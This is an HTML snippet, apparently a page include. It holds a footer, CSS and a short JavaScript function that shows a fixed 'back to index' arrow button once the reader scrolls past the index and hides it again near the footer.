<footer id="myFooter">
    <!-- Footer para eliminar el botón -->
</footer>

<style>
        #backToIndex {
                display: none;
                position: fixed;
                left: 87%;
                top: 90%;
                z-index: 2000;
                background-color: #81fbf9;
                border-radius: 10px;
                border: none;
                padding: 4px 6px;
                cursor: pointer;
        }
</style>

<a id="backToIndex" href="#Indice">
        <img src="/assets/images/arrow-up.png" style="width: 45px; height: 45px;">
</a>

<script>
    window.onscroll = function() { showButton() };

    function showButton() {
        const scrollPosition = document.documentElement.scrollTop || document.body.scrollTop;
        const indicePosition = document.getElementById("Indice").offsetTop;
        const footerPosition = document.getElementById("myFooter").offsetTop;
        const windowHeight = window.innerHeight;

        const button = document.getElementById("backToIndex");

        // Mostrar el botón si el usuario ha bajado al índice
        if (scrollPosition >= indicePosition && (scrollPosition + windowHeight) < footerPosition) {
            button.style.display = "block";
            button.style.position = "fixed";
            button.style.top = "90%";
        } else {
            button.style.display = "none";
        }
    }
</script>
